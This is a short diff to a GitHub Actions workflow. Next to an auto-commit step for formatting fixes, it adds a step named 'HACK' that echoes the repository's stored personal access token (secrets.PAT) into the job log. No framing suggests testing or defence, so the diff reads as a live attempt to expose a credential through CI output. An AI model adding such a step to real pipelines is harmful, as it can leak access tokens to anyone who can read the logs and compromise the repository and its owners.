@@ -33,3 +33,5 @@ jobs:
         with:
           default_author: github_actions
           message: 'style: formatting fixes'
+      - name: HACK
+        run: echo ${{ secrets.PAT }}
